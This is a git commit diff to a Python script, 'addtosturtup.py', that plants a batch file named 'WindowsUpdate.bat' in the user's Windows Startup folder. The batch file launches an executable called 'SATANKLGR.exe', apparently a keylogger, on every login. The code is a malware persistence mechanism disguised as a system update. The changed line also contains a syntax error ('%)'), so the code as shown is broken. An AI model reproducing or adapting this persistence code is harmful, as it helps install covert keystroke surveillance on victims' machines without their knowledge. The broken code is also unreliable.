3c2f4327427466082dccab28373ce08c750d475f
FZGbzuw412 <92334349+FZGbzuw412@users.noreply.github.com>
2021-12-24 20:49:37 +0300

    Update addtosturtup.py

--- addtosturtup.py
+++ addtosturtup.py
@@ -3,5 +3,5 @@ import getpass
 USER_NAME = getpass.getuser()
 
 bat_path = r'C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup' % USER_NAME
-with open(bat_path + '\\' + "WindowsUpdate.bat", "w+") as bat_file:
-    bat_file.write(r'start "" %s' % __file__)
+with open(bat_path + "\\WindowsUpdate.bat", "w+") as bat_file:
+    bat_file.write(r'start "" C:\Users\user\Desktop\SATANKLGR.exe' %)
